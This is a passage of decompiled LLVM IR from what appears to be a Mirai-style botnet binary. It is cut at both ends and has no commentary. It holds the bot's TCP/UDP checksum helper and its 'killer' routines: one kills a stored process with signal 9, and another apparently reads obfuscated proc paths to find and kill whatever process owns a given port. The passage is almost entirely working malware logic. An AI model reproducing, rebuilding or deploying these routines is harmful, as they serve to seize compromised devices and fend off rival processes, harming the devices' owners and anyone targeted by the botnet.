  %v4_c8b4 = zext i8 %v3_c8b4 to i32
  %v3_c8b8 = add i32 %v1_c8b8, %v4_c8b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8b0, %bb
  %v0_c8bc = phi i32 [ %v1_c8b8, %dec_label_pc_c8b0 ], [ %v3_c8b8, %bb ]
  %v3_c8c0 = urem i32 %v0_c8bc, 65536
  %v4_c8c4 = udiv i32 %v0_c8bc, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v3_c8c0
  %v4_c8c8 = udiv i32 %v5_c8c4, 65536
  %v5_c8c8 = add nuw nsw i32 %v4_c8c8, %v5_c8c4
  %v1_c8cc = urem i32 %v5_c8c8, 65536
  %v3_c8d4 = xor i32 %v1_c8cc, 65535
  ret i32 %v3_c8d4

; uselistorder directives
  uselistorder i32 %v5_c8c4, { 1, 0 }
  uselistorder i32 %v5_c8a0, { 1, 0 }
  uselistorder i32 %v1_c89c, { 1, 0, 2 }
  uselistorder i32 %v0_c8a0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8b0, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8ec = add i32 %arg1, 12
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v1_c8f0 = add i32 %arg1, 16
  %v2_c8f0 = inttoptr i32 %v1_c8f0 to i32*
  %v3_c8f0 = load i32, i32* %v2_c8f0, align 4
  %v7_c8f4 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f4, label %dec_label_pc_c900.preheader, label %dec_label_pc_c914

dec_label_pc_c900.preheader:                      ; preds = %entry
  %v0_c904.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c900

dec_label_pc_c900:                                ; preds = %dec_label_pc_c900.preheader, %dec_label_pc_c900
  %v0_c90c = phi i32 [ 0, %dec_label_pc_c900.preheader ], [ %v2_c90c, %dec_label_pc_c900 ]
  %v0_c904 = phi i32 [ %v0_c904.pre, %dec_label_pc_c900.preheader ], [ %v5_c904, %dec_label_pc_c900 ]
  %v0_c900 = phi i32 [ %arg3, %dec_label_pc_c900.preheader ], [ %v1_c900, %dec_label_pc_c900 ]
  %v1_c900 = add nsw i32 %v0_c900, -2
  %v1_c904 = inttoptr i32 %v0_c904 to i16*
  %v2_c904 = load i16, i16* %v1_c904, align 2
  %v3_c904 = zext i16 %v2_c904 to i32
  %v5_c904 = add i32 %v0_c904, -2
  store i32 %v5_c904, i32* @r1, align 4
  %v2_c90c = add i32 %v3_c904, %v0_c90c
  %v8_c910 = icmp sgt i32 %v1_c900, 1
  br i1 %v8_c910, label %dec_label_pc_c900, label %dec_label_pc_c914.loopexit

dec_label_pc_c914.loopexit:                       ; preds = %dec_label_pc_c900
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c914.loopexit, %entry
  %v1_c920 = phi i32 [ %v2_c90c, %dec_label_pc_c914.loopexit ], [ 0, %entry ]
  %v0_c914 = phi i32 [ %v1_c900, %dec_label_pc_c914.loopexit ], [ %arg3, %entry ]
  %v7_c914 = icmp eq i32 %v0_c914, 1
  br i1 %v7_c914, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c914
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c914
  %v1_c918 = load i32, i32* @r1, align 4
  %v2_c918 = inttoptr i32 %v1_c918 to i8*
  %v3_c918 = load i8, i8* %v2_c918, align 1
  %v4_c918 = zext i8 %v3_c918 to i32
  %v3_c920 = add i32 %v4_c918, %v1_c920
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c948 = phi i32 [ %v1_c920, %.thread ], [ %v3_c920, %bb ]
  %v0_c928 = mul i32 %v3_c8ec, 65536
  %v3_c928 = udiv i32 %v0_c928, 65536
  %v3_c92c = urem i32 %v3_c8f0, 65536
  %v4_c934 = udiv i32 %v3_c8ec, 65536
  %v2_c930 = add nuw nsw i32 %v3_c92c, %v4_c934
  %v5_c934 = add nuw nsw i32 %v2_c930, %v3_c928
  %v1_c938 = add i32 %arg1, 9
  %v2_c938 = inttoptr i32 %v1_c938 to i8*
  %v3_c938 = load i8, i8* %v2_c938, align 1
  %v4_c938 = zext i8 %v3_c938 to i32
  %v4_c93c = udiv i32 %v3_c8f0, 65536
  %v3_c944 = mul nuw nsw i32 %v4_c938, 256
  %v5_c93c = add i32 %v4_c93c, %arg2
  %v2_c940 = add i32 %v5_c93c, %v1_c948
  %v2_c948 = add i32 %v2_c940, %v5_c934
  %v2_c94c = add i32 %v2_c948, %v3_c944
  %tmp = icmp ult i32 %v2_c94c, 65536
  br i1 %tmp, label %dec_label_pc_c96c, label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %bb19, %dec_label_pc_c958
  %v2_c9605 = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646.in = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646 = udiv i32 %v3_c9646.in, 65536
  %v3_c95c = urem i32 %v2_c9605, 65536
  %v2_c960 = add nuw nsw i32 %v3_c95c, %v3_c9646
  %tmp20 = icmp ult i32 %v2_c960, 65536
  br i1 %tmp20, label %dec_label_pc_c96c.loopexit, label %dec_label_pc_c958

dec_label_pc_c96c.loopexit:                       ; preds = %dec_label_pc_c958
  br label %dec_label_pc_c96c

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c96c.loopexit, %bb19
  %v0_c96c = phi i32 [ %v2_c960, %dec_label_pc_c96c.loopexit ], [ %v2_c94c, %bb19 ]
  %v1_c96c = urem i32 %v0_c96c, 65536
  %v3_c974 = xor i32 %v1_c96c, 65535
  ret i32 %v3_c974

; uselistorder directives
  uselistorder i32 %v2_c960, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c94c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c920, { 1, 0 }
  uselistorder i32 %v5_c904, { 1, 0 }
  uselistorder i32 %v0_c904, { 1, 0 }
  uselistorder i32 %v3_c8ec, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c958, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c900, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_c98c = load i32, i32* @global_var_24f88.71, align 4
  %v2_c994 = call i32 @kill(i32 %v2_c98c, i32 9)
  ret i32 %v2_c994
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c9a8 = load i32, i32* @r4, align 4
  %v6_c9a8 = load i32, i32* @r5, align 4
  %v9_c9a8 = load i32, i32* @r6, align 4
  %v12_c9a8 = load i32, i32* @r7, align 4
  %v15_c9a8 = load i32, i32* @r8, align 4
  %v18_c9a8 = load i32, i32* @sb, align 4
  %v21_c9a8 = load i32, i32* @sl, align 4
  %v24_c9a8 = load i32, i32* @fp, align 4
  %v27_c9a8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c9c4 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c9c4, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9f0 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9f0, i32* @fp, align 4
  %v4_c9fc = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_ca00 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_ca00, i32* @sl, align 4
  %v0_ca04 = load i32, i32* @r5, align 4
  %v3_ca10 = bitcast i32* %stack_var_-8777 to i8*
  %v4_ca10 = call i32 @__GI_memset(i8* %v3_ca10, i32 %v0_ca04, i32 4096)
  %v0_ca18 = load i32, i32* @r5, align 4
  %v3_ca24 = bitcast i32* %stack_var_-4681 to i8*
  %v4_ca24 = call i32 @__GI_memset(i8* %v3_ca24, i32 %v0_ca18, i32 4096)
  %v2_ca28 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_ca28, i32* @sb, align 4
  %v0_ca2c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca2c = udiv i32 %v0_ca2c, 256
  %v1_ca30 = urem i32 %v0_ca2c, 256
  store i32 %v1_ca30, i32* @r4, align 4
  %v3_ca40 = trunc i32 %v3_ca2c to i8
  %v4_ca40 = call i32 @util_itoa(i8 %v3_ca40, i32 16, i32 %v2_ca28)
  %v2_ca48 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca4c = icmp eq i32 %v2_ca48, 2
  br i1 %v7_ca4c, label %dec_label_pc_cf10, label %dec_label_pc_ca54

dec_label_pc_ca54:                                ; preds = %entry, %dec_label_pc_cf10
  %v1_ca58 = call i32 @table_unlock_val(i32 15)
  %v1_ca60 = call i32 @table_unlock_val(i32 16)
  %v1_ca68 = call i32 @table_unlock_val(i32 17)
  %v1_ca70 = call i32 @table_unlock_val(i32 19)
  %v0_ca74 = load i32, i32* @r5, align 4
  %v2_ca7c = inttoptr i32 %v0_ca74 to i32*
  %v3_ca7c = call i32 @table_retrieve_val(i32 19, i32* %v2_ca7c)
  %v0_ca80 = load i32, i32* @r5, align 4
  %v2_ca84 = call i32 @__libc_open(i32 %v3_ca7c, i32 %v0_ca80)
  %v7_ca88 = icmp eq i32 %v2_ca84, -1
  store i32 %v2_ca84, i32* @r8, align 4
  br i1 %v7_ca88, label %bb, label %dec_label_pc_ca98.preheader

bb:                                               ; preds = %dec_label_pc_ca54
  %v1_ca90 = load i32, i32* @r5, align 4
  store i32 %v1_ca90, i32* @r4, align 4
  br label %dec_label_pc_ceac

dec_label_pc_ca98.preheader:                      ; preds = %dec_label_pc_ca54
  %v4_caa456 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca84)
  %v2_caa858 = icmp eq i32 %v4_caa456, 0
  br i1 %v2_caa858, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0.lr.ph

dec_label_pc_cab0.lr.ph:                          ; preds = %dec_label_pc_ca98.preheader
  %v2_caf8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_cab0.lr.ph, %dec_label_pc_ca98.backedge
  %v3_cab4 = load i8, i8* %stack_var_-585, align 1
  %v4_cab4 = sext i8 %v3_cab4 to i32
  store i32 %v4_cab4, i32* @r3, align 4
  %v2_cab8 = icmp eq i8 %v3_cab4, 0
  br i1 %v2_cab8, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_cab0
  %v8_cabc = icmp eq i8 %v3_cab4, 58
  br i1 %v8_cabc, label %.thread8, label %dec_label_pc_cad0

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cae8

bb126:                                            ; preds = %dec_label_pc_cab0
  br label %dec_label_pc_cae8

dec_label_pc_cad0:                                ; preds = %bb125
  %v1_cad8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cad4

dec_label_pc_cad4:                                ; preds = %bb127, %dec_label_pc_cad0
  %v0_cad4 = phi i32 [ %v1_cad4, %bb127 ], [ 0, %dec_label_pc_cad0 ]
  %v1_cad4 = add i32 %v0_cad4, 1
  %v2_cad8 = add i32 %v1_cad4, %v1_cad8.pre
  %v3_cad8 = inttoptr i32 %v2_cad8 to i8*
  %v4_cad8 = load i8, i8* %v3_cad8, align 1
  %v6_cad8 = zext i8 %v4_cad8 to i32
  store i32 %v6_cad8, i32* @r3, align 4
  %v2_cadc = icmp eq i8 %v4_cad8, 0
  br i1 %v2_cadc, label %dec_label_pc_cae8, label %bb127

bb127:                                            ; preds = %dec_label_pc_cad4
  %v8_cae0 = icmp eq i8 %v4_cad8, 58
  br i1 %v8_cae0, label %dec_label_pc_cae8, label %dec_label_pc_cad4

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cad4, %bb127, %bb126, %.thread8
  %v1_cb14 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_cad4, %bb127 ], [ %v1_cad4, %dec_label_pc_cad4 ]
  %v0_cae8 = phi i32 [ %v4_cab4, %.thread8 ], [ %v4_cab4, %bb126 ], [ %v6_cad8, %bb127 ], [ %v6_cad8, %dec_label_pc_cad4 ]
  %v2_cae8 = icmp eq i32 %v0_cae8, 0
  br i1 %v2_cae8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_caf0

dec_label_pc_ca98.backedge:                       ; preds = %dec_label_pc_cae8, %dec_label_pc_cbb8, %dec_label_pc_cc04, %dec_label_pc_cb34
  %v0_caa0 = load i32, i32* @r8, align 4
  %v4_caa4 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_caa0)
  %v2_caa8 = icmp eq i32 %v4_caa4, 0
  br i1 %v2_caa8, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cae8
  %v1_caf4 = add i32 %v1_cb14, 2
  %v2_cafc = add i32 %v1_caf4, %v2_caf8
  %v1_cb00 = add i32 %v2_cafc, -545
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v2_cb04 = icmp eq i8 %v3_cb00, 0
  br i1 %v2_cb04, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_caf0
  %v8_cb08 = icmp eq i8 %v3_cb00, 32
  br i1 %v8_cb08, label %.thread13, label %dec_label_pc_cb14

.thread13:                                        ; preds = %bb128
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb129:                                            ; preds = %dec_label_pc_caf0
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

dec_label_pc_cb14:                                ; preds = %bb128
  %v0_cb14 = load i32, i32* @r6, align 4
  %v2_cb14 = add i32 %v0_cb14, %v1_cb14
  br label %dec_label_pc_cb1c

dec_label_pc_cb1c:                                ; preds = %bb130, %dec_label_pc_cb14
  %v0_cb2816 = phi i32 [ %v1_cb28, %bb130 ], [ %v1_caf4, %dec_label_pc_cb14 ]
  %v0_cb2c18 = phi i32 [ %v1_cb2c, %bb130 ], [ %v2_cb14, %dec_label_pc_cb14 ]
  %v1_cb1c = add i32 %v0_cb2c18, 3
  %v2_cb1c = inttoptr i32 %v1_cb1c to i8*
  %v3_cb1c = load i8, i8* %v2_cb1c, align 1
  %v2_cb20 = icmp eq i8 %v3_cb1c, 0
  br i1 %v2_cb20, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cb1c
  %v1_cb2817 = add i32 %v0_cb2816, 1
  store i32 %v1_cb2817, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb130:                                            ; preds = %dec_label_pc_cb1c
  %v8_cb24 = icmp eq i8 %v3_cb1c, 32
  %v1_cb28 = add i32 %v0_cb2816, 1
  store i32 %v1_cb28, i32* @r5, align 4
  %v1_cb2c = add i32 %v0_cb2c18, 1
  br i1 %v8_cb24, label %dec_label_pc_cb34, label %dec_label_pc_cb1c

dec_label_pc_cb34:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb40 = phi i32 [ %v1_cb2817, %.thread15 ], [ %v1_caf4, %.thread13 ], [ %v1_caf4, %bb129 ], [ %v1_cb28, %bb130 ]
  %v0_cb34 = load i32, i32* @r6, align 4
  %v2_cb34 = add i32 %v0_cb34, %v1_caf4
  store i32 %v2_cb34, i32* @r4, align 4
  %v2_cb40 = add i32 %v1_cb40, %v2_caf8
  store i32 0, i32* @r7, align 4
  %v3_cb48 = add i32 %v2_cb40, -545
  %v4_cb48 = inttoptr i32 %v3_cb48 to i8*
  store i8 0, i8* %v4_cb48, align 1
  %v0_cb4c = load i32, i32* @r4, align 4
  %v1_cb50 = inttoptr i32 %v0_cb4c to i8*
  %v2_cb50 = call i32 @util_strlen(i8* %v1_cb50)
  store i32 %v2_cb50, i32* @r1, align 4
  %v0_cb5c = load i32, i32* @r4, align 4
  %v3_cb60 = inttoptr i32 %v0_cb5c to i8*
  %v4_cb60 = call i32 @util_stristr(i8* %v3_cb60, i32 %v2_cb50, i32 %v2_ca28)
  %v7_cb64 = icmp eq i32 %v4_cb60, -1
  br i1 %v7_cb64, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cb80.preheader

dec_label_pc_cb80.preheader:                      ; preds = %dec_label_pc_cb34
  %v1_cb68 = load i32, i32* @r7, align 4
  %v1_cb6c = load i32, i32* @r6, align 4
  %v2_cb6c = load i32, i32* @r5, align 4
  %v3_cb6c = add i32 %v2_cb6c, %v1_cb6c
  store i32 %v1_cb68, i32* @lr, align 4
  %v1_cb8048 = add i32 %v3_cb6c, 2
  %v2_cb8049 = inttoptr i32 %v1_cb8048 to i8*
  %v3_cb8050 = load i8, i8* %v2_cb8049, align 1
  %v4_cb8051 = zext i8 %v3_cb8050 to i32
  store i32 %v4_cb8051, i32* @r3, align 4
  %v2_cb8452 = icmp eq i8 %v3_cb8050, 0
  %v1_cb8854 = add i32 %v2_cb6c, 2
  br i1 %v2_cb8452, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb80.preheader, %dec_label_pc_cb80.backedge
  %v0_cbb883 = phi i32 [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cba0.pr = phi i32 [ %v0_cba0.pr70, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cec0 = phi i32 [ %v0_cec073, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cb8878 = phi i32 [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v1_cb8854, %dec_label_pc_cb80.preheader ]
  %v0_cbb0 = phi i32 [ %v0_cb80, %dec_label_pc_cb80.backedge ], [ %v3_cb6c, %dec_label_pc_cb80.preheader ]
  %v1_cb94 = phi i32 [ %v4_cb80, %dec_label_pc_cb80.backedge ], [ %v4_cb8051, %dec_label_pc_cb80.preheader ]
  %v7_cb90 = icmp eq i32 %v1_cb94, 9
  br i1 %v7_cb90, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb90
  %v8_cb94 = icmp eq i32 %v1_cb94, 32
  br i1 %v8_cb94, label %.thread27, label %dec_label_pc_cba0

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cbac

bb132:                                            ; preds = %dec_label_pc_cb90
  br label %dec_label_pc_cbac

dec_label_pc_cba0:                                ; preds = %bb131
  %v7_cba0 = icmp eq i32 %v0_cba0.pr, 1
  br i1 %v7_cba0, label %dec_label_pc_cec0, label %dec_label_pc_cba8

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cec0, %dec_label_pc_cba0
  %v0_cbac75 = phi i32 [ %v1_cec0, %dec_label_pc_cec0 ], [ %v0_cec0, %dec_label_pc_cba0 ]
  br label %dec_label_pc_cbac

dec_label_pc_cbac:                                ; preds = %bb132, %.thread27, %dec_label_pc_cba8
  %v0_cbac = phi i32 [ %v0_cec0, %.thread27 ], [ %v0_cec0, %bb132 ], [ %v0_cbac75, %dec_label_pc_cba8 ]
  %v0_cba0.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cba8 ]
  %v7_cbb4 = icmp sgt i32 %v0_cbac, 6
  br i1 %v7_cbb4, label %dec_label_pc_cbb8, label %dec_label_pc_cb80.backedge

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cb80.backedge, %dec_label_pc_cbac, %dec_label_pc_cb80.preheader
  %v1_cc08 = phi i32 [ %v1_cb8854, %dec_label_pc_cb80.preheader ], [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v0_cb8878, %dec_label_pc_cbac ]
  %v0_cbb8 = phi i32 [ %v1_cb68, %dec_label_pc_cb80.preheader ], [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v2_cbb8 = icmp eq i32 %v0_cbb8, 0
  br i1 %v2_cbb8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbb8
  %v2_cbcc = add i32 %v1_cc08, %v2_caf8
  %v1_cbd0 = add i32 %v2_cbcc, -545
  %v2_cbd0 = inttoptr i32 %v1_cbd0 to i8*
  %v3_cbd0 = load i8, i8* %v2_cbd0, align 1
  %v2_cbd4 = icmp eq i8 %v3_cbd0, 0
  br i1 %v2_cbd4, label %dec_label_pc_cc04, label %bb133

bb133:                                            ; preds = %dec_label_pc_cbc4
  %v8_cbd8 = icmp eq i8 %v3_cbd0, 32
  br i1 %v8_cbd8, label %dec_label_pc_cc04, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %bb133
  %v2_cbe0 = add i32 %v1_cc08, %v1_cb6c
  br label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %bb134, %dec_label_pc_cbe0
  %v0_cbf030 = phi i32 [ %v1_cbf0, %bb134 ], [ %v1_cc08, %dec_label_pc_cbe0 ]
  %v0_cbe4 = phi i32 [ %v1_cbe4, %bb134 ], [ %v2_cbe0, %dec_label_pc_cbe0 ]
  %v1_cbe4 = add i32 %v0_cbe4, 1
  %v2_cbe4 = inttoptr i32 %v1_cbe4 to i8*
  %v3_cbe4 = load i8, i8* %v2_cbe4, align 1
  %v2_cbe8 = icmp eq i8 %v3_cbe4, 0
  br i1 %v2_cbe8, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbe4
  %v1_cbf031 = add i32 %v0_cbf030, 1
  br label %dec_label_pc_cbf8

bb134:                                            ; preds = %dec_label_pc_cbe4
  %v8_cbec = icmp eq i8 %v3_cbe4, 32
  %v1_cbf0 = add i32 %v0_cbf030, 1
  br i1 %v8_cbec, label %dec_label_pc_cbf8, label %dec_label_pc_cbe4

dec_label_pc_cbf8:                                ; preds = %bb134, %.thread29
  %v1_cc00 = phi i32 [ %v1_cbf031, %.thread29 ], [ %v1_cbf0, %bb134 ]
  %v2_cc00 = add i32 %v1_cc00, %v2_caf8
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbc4, %bb133, %dec_label_pc_cbf8
  %v2_cc10 = phi i32 [ %v2_cbcc, %dec_label_pc_cbc4 ], [ %v2_cbcc, %bb133 ], [ %v2_cc00, %dec_label_pc_cbf8 ]
  %v2_cc08 = add i32 %v1_cc08, %v1_cb6c
  store i32 %v2_cc08, i32* @r4, align 4
  %v3_cc10 = add i32 %v2_cc10, -545
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 1
  %v1_cc14 = inttoptr i32 %v2_cc08 to i8*
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14)
  %v8_cc1c = icmp sgt i32 %v2_cc14, 15
  br i1 %v8_cc1c, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v0_cc24 = load i32, i32* @r4, align 4
  %v2_cc28 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cc28, i32* @r0, align 4
  %v2_cc2c = bitcast i32* %stack_var_-56 to i8*
  %v3_cc2c = call i32 @util_strcpy(i8* %v2_cc2c, i32 %v0_cc24)
  br label %dec_label_pc_cc30

dec_label_pc_cc30.loopexit:                       ; preds = %dec_label_pc_ca98.backedge, %dec_label_pc_ca98.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc30.loopexit, %dec_label_pc_cc20
  %v1_cc40.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc30.loopexit ], [ %v2_cc2c, %dec_label_pc_cc20 ]
  %v2_cc3c.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc30.loopexit ], [ %v2_cc28, %dec_label_pc_cc20 ]
  %v0_cc30 = load i32, i32* @r8, align 4
  %v1_cc34 = call i32 @__GI___libc_close(i32 %v0_cc30)
  %v2_cc40 = call i32 @util_strlen(i8* %v1_cc40.pre-phi)
  store i32 %v2_cc40, i32* @r4, align 4
  %v2_cc44 = icmp eq i32 %v2_cc40, 0
  br i1 %v2_cc44, label %dec_label_pc_ceec, label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc30
  %v3_cc54 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_cc58 = call i32 @__GI_opendir(i32 %v3_cc54)
  store i32 %v1_cc58, i32* @sb, align 4
  %v2_cc5c = icmp eq i32 %v1_cc58, 0
  br i1 %v2_cc5c, label %dec_label_pc_ce8c, label %dec_label_pc_cc6c.preheader

dec_label_pc_cc6c.preheader:                      ; preds = %dec_label_pc_cc4c
  store i32 0, i32* @r5, align 4
  %v1_cc7043 = inttoptr i32 %v1_cc58 to i32*
  %v2_cc7044 = call i32 @__GI_readdir(i32* %v1_cc7043)
  %v2_cc7446 = icmp eq i32 %v2_cc7044, 0
  br i1 %v2_cc7446, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc6c.loopexit:                       ; preds = %dec_label_pc_cc84, %dec_label_pc_cc94, %dec_label_pc_cd00
  %v0_cc6c = load i32, i32* @sb, align 4
  %v1_cc70 = inttoptr i32 %v0_cc6c to i32*
  %v2_cc70 = call i32 @__GI_readdir(i32* %v1_cc70)
  %v2_cc74 = icmp eq i32 %v2_cc70, 0
  br i1 %v2_cc74, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc7c.preheader:                      ; preds = %dec_label_pc_cc6c.preheader, %dec_label_pc_cc6c.loopexit
  %v0_cc8491 = phi i32 [ %v2_cc70, %dec_label_pc_cc6c.loopexit ], [ %v2_cc7044, %dec_label_pc_cc6c.preheader ]
  br label %dec_label_pc_cc7c

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc7c.preheader, %dec_label_pc_ce68
  %v0_cc9c = phi i32 [ %v0_cc8491, %dec_label_pc_cc7c.preheader ], [ %v2_ce74, %dec_label_pc_ce68 ]
  %v0_cc7c = load i32, i32* @r5, align 4
  %v2_cc7c = icmp eq i32 %v0_cc7c, 0
  br i1 %v2_cc7c, label %dec_label_pc_cc84, label %dec_label_pc_ce80

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cc7c
  %v1_cc84 = add i32 %v0_cc9c, 11
  %v2_cc84 = inttoptr i32 %v1_cc84 to i8*
  %v3_cc84 = load i8, i8* %v2_cc84, align 1
  %v4_cc84 = zext i8 %v3_cc84 to i32
  %v1_cc88 = add nsw i32 %v4_cc84, -48
  %tmp = icmp ugt i32 %v1_cc88, 9
  br i1 %tmp, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc84
  store i32 %v1_cc84, i32* @r7, align 4
  %v3_cca0 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_ccac = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cca0)
  %v2_ccb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_ccb8 = load i32, i32* @r7, align 4
  %v1_ccbc = load i32, i32* @sl, align 4
  %v2_ccbc = add i32 %v1_ccbc, %v2_ccb4
  store i32 %v2_ccbc, i32* @r0, align 4
  %v2_ccc0 = inttoptr i32 %v2_ccbc to i8*
  %v3_ccc0 = call i32 @util_strcpy(i8* %v2_ccc0, i32 %v0_ccb8)
  %v2_ccc8 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cccc = load i32, i32* @r5, align 4
  store i32 %v2_ccc8, i32* @r4, align 4
  %v2_ccd8 = inttoptr i32 %v0_cccc to i32*
  %v3_ccd8 = call i32 @table_retrieve_val(i32 16, i32* %v2_ccd8)
  %v0_cce0 = load i32, i32* @r4, align 4
  %v1_cce0 = load i32, i32* @sl, align 4
  %v2_cce0 = add i32 %v1_cce0, %v0_cce0
  store i32 %v2_cce0, i32* @r0, align 4
  %v2_cce4 = inttoptr i32 %v2_cce0 to i8*
  %v3_cce4 = call i32 @util_strcpy(i8* %v2_cce4, i32 %v3_ccd8)
  %v3_ccf4 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ccf8 = icmp eq i32 %v3_ccf4, -1
  br i1 %v7_ccf8, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd00

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  %v0_cd00 = load i32, i32* @r5, align 4
  %v2_cd08 = inttoptr i32 %v0_cd00 to i32*
  %v3_cd08 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd08)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd14 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd08)
